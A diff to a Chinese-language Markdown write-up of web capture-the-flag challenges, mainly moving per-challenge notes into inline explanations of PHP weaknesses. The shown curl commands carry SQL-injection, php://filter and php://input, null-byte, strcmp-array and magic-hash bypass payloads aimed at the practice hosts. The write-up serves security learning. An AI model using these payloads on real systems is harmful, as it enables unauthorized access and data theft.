@@ -42,9 +42,6 @@ javascript里也存在类似的问题，区别在于如果两个都是字符串�
 '0E111' == '0e12345' // false
 ```
 
-### Notes
-- `==` and float number format strings in php: [Why md5('240610708') is equal to md5('QNKCDZO')?](https://stackoverflow.com/questions/22140204)
-
 
 ## 签到2
 
@@ -60,8 +57,8 @@ javascript里也存在类似的问题，区别在于如果两个都是字符串�
 0000a350  61 6c 73 6f 5f 68 69 64  33 5f 6d 73 67 7d 20 20  |also_hid3_msg}  |
 0000a360  20 20 20 20 20 20 20 20  20 20 20 20 20 20        |              |
 ```
-### Notes
-- 原来图片可以藏信息，图片的展示也不会受到影响。
+
+原来图片可以藏信息，图片的展示也不会受到影响。
 
 
 ## [单身二十年](http://chinalover.sinaapp.com/web8/)
@@ -77,9 +74,6 @@ curl http://chinalover.sinaapp.com/web8/search_key.php
 key is : nctf{yougotit_script_now}
 ```
 
-### Notes
-
-- [`window.location`](https://developer.mozilla.org/en-US/docs/Web/API/Window/location)
 
 ## [单身一百年也没用](http://chinalover.sinaapp.com/web9/)
 
@@ -118,10 +112,7 @@ eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));
 curl http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
 ```
 
-### Notes
-
-- php [filter](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter)
-
+PHP 的文件处理函数允许使用 php scheme 读取自定义的I/O流。
 
 ## [Cookie](http://chinalover.sinaapp.com/web10/index.php)
 
@@ -161,10 +152,6 @@ if($_GET[id]) {
 ```shell
 curl http://chinalover.sinaapp.com/web11/sql.php?id=1024.1
 ```
-### Notes
-
-- robots.txt
-- `intval` in php
 
 ## [/x00](http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php)
 源代码要求1. 正则表达式开头到结尾只能包含1-9 2.同时包含`#biubiubiu`
@@ -179,18 +166,10 @@ if (isset ($_GET['nctf'])) {
         echo '骚年，继续努力吧啊~';
 }
 ```
-题目有提示`\x00`
+题目有提示`\x00`。`egrep` 会为`\x00`匹配字符结束`$`；需要通过percent encoding传输`\x00`：
 ```shell
 curl http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=12222%00%23biubiubiu
 ```
-### Notes
-
-- `ereg`: null byte is considered as the end of string
-- [percent encoding](https://stackoverflow.com/a/5007362/8706476) in urls or form data
-  - null byte "\x00": `%00`
-  - pound sign "#": `%23`
-  - single quote "'": `%27`
-  - right parenthesis ")": `%29`
 
 ## [bypass again](http://chinalover.sinaapp.com/web17/index.php)
 
@@ -223,14 +202,10 @@ curl 'http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&&b=s214587387a'
   <?php } ?>
 <?php } ?>
 ```
-
+extract函数覆盖命名空间：
 ```shell
 curl 'http://chinalover.sinaapp.com/web18/' -X POST -d 'pass=kke&thepassword_123=kke'
 ```
-
-### Notes
-
-- php `extract` imports variables into the current symbol table from an array
 
 ## [伪装者](http://chinalover.sinaapp.com/web4/xxx.php)
 
@@ -270,15 +245,10 @@ if($_POST[user] && $_POST[pass]) {
 }
 echo $query[user];
 ```
-
+因为用了trim，要在`-- `空格的后面加上其它字符，否则注释的作用会失效。
 ```shell
 curl http://chinalover.sinaapp.com/index.php -X POST -d 'user=admin%27%29+--+k&pass=Password'
 ```
-
-### Notes
-
-- [comments in MySQL](https://stackoverflow.com/a/14436098/8706476): `--` followed by space characters
-  - append additional characters in case of `trim`
 
 ## [pass check](http://chinalover.sinaapp.com/web21/)
 ```php
@@ -296,13 +266,12 @@ if(isset($pass))
   echo "please input pass!";
 }
 ```
-
+当输入参数是一个数组时，strcmp会报错并且无返回：
 ```shell
 curl http://chinalover.sinaapp.com/web21/ -X POST -d 'pass[]='
 ```
-### Notes
-- `strcmp` reports a warning and returns nothing when given an array
-- POST array with [`curl`](https://stackoverflow.com/a/22741771/8706476)
+
+
 
 ## [起名字真难](http://chinalover.sinaapp.com/web12/index.php)
 源代码要求1. 输入不是1-9；2.等于54975581388
@@ -329,13 +298,11 @@ else
    echo 'access denied';
 ```
 
-可以留意到比较范围是1-9，少了0，可能是因为答案需要十六进制前缀0x的关系；刚好54975581388的16进制没有1-9。
+可以留意到比较范围是1-9，少了0，可能是因为答案需要十六进制前缀0x的关系；在使用==比较的时候，php会将十六进制的数字字符串转型为整数。刚好 54975581388 的16进制表示`0xccccccccc`没有1-9。
 
 ```shell
 curl http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc
 ```
-### Notes
-- php [loosely equal comparison](https://stackoverflow.com/a/80649/8706476): cast hex string to integer
 
 
 ## [SQL注入2](http://4.chinalover.sinaapp.com/web6/index.php)
@@ -361,10 +328,6 @@ if($_POST[user] && $_POST[pass]) {
 curl http://4.chinalover.sinaapp.com/web6/index.php -X POST -d 'user=1%27+union+select+md5%28%2725252%27%29+--+m&pass=25252'
 ```
 
-### Notes
-
-- php [`mysql_fetch_array`](https://www.php.net/manual/en/function.mysql-fetch-array.php): Fetch **a** result row 
-
 
 ## [file_get_contents](http://chinalover.sinaapp.com/web23/)
 
@@ -375,13 +338,10 @@ if(@file_get_contents($file) == "meizijiu"){
     echo $nctf;
 }-->
 ```
-
+php scheme `input` 从 `_POST` 读取内容：
 ```shell
 curl http://chinalover.sinaapp.com/web23/?file=php://input -X POST -d 'meizijiu'
 ```
-
-### Notes
-- php [I/O streams](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.input): `php://input` reads from `$_POST`
 
 ## [变量覆盖](http://chinalover.sinaapp.com/web24/)
 
@@ -394,25 +354,23 @@ if($name == "meizijiu233"){
     echo $flag;
 }-->
 ```
-
+PHP的可变变量：
 ```shell
 curl http://chinalover.sinaapp.com/web24/?name=meizijiu233
 ```
 
-### Notes
-- php [variable variable](https://www.php.net/manual/en/language.variables.variable.php)
 
 # Notes
 
 - php
-  - `strcmp` raises a warning but returns nothing when given an array
+  - `strcmp` reports a warning and returns nothing when given an array
   - `extract` imports variables into and may corrupts the current symbol table from an array 
   - `ereg` considers null byte as the end of string, 
     - while null bytes don't actually terminate a string.
-  - loosely equality `==`
+  - loosely equal comparison `==`
     - type cast
       - hex string to integer
-    - float number format strings
+    - float number format strings: [Why md5('240610708') is equal to md5('QNKCDZO')?](https://stackoverflow.com/questions/22140204)
   - [I/O streams](https://www.php.net/manual/en/wrappers.php.php) along with file functions and **include** statement
     - url taking as argument filename or php's
     - `php://input` reads from `$_POST`
@@ -421,7 +379,7 @@ curl http://chinalover.sinaapp.com/web24/?name=meizijiu233
         - `read=convert.base64-encode` can dump current page without recursion
       - `resource`: file
   - [variable variable](https://www.php.net/manual/en/language.variables.variable.php) allows user to have variable variable names. 
-  - `mysql_fetch_array` fetches one row
+  - [`mysql_fetch_array`](https://www.php.net/manual/en/function.mysql-fetch-array.php): Fetch **a** result row 
 - sqli
   - single quotes
   - comments `--` followed by **spaces**
@@ -429,7 +387,7 @@ curl http://chinalover.sinaapp.com/web24/?name=meizijiu233
   - `union`
     - short circuit evaluation
 - `curl`
-  - post an array in form data
+  - post an array in form data via [`curl`](https://stackoverflow.com/a/22741771/8706476)
 - http
   - headers
     - `X-Forwarded-For`
